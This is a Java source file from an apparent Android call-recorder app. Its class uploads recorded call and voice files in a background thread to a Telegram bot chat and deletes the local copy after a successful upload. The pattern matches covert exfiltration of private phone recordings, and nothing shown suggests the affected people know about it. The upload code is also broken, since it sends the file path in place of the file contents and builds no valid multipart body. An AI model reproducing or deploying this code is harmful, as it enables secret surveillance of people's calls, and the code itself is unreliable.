package com.example.callvoicerecorder;

import android.content.Context;
import java.io.File;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;

public class TelegramUploader {
    private static final String TELEGRAM_BOT_TOKEN = Constants.TELEGRAM_BOT_TOKEN;
    private static final String CHAT_ID = Constants.TELEGRAM_CHAT_ID;

    public static void sendToTelegram(Context context, File file, boolean isCall) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendDocument";
                HttpURLConnection conn = (HttpURLConnection) new URL(urlString).openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data");

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(("chat_id=" + CHAT_ID).getBytes());
                    os.write(("document=" + file.getAbsolutePath()).getBytes());
                    os.flush();
                }

                if (conn.getResponseCode() == 200) {
                    file.delete(); // Delete after sending
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
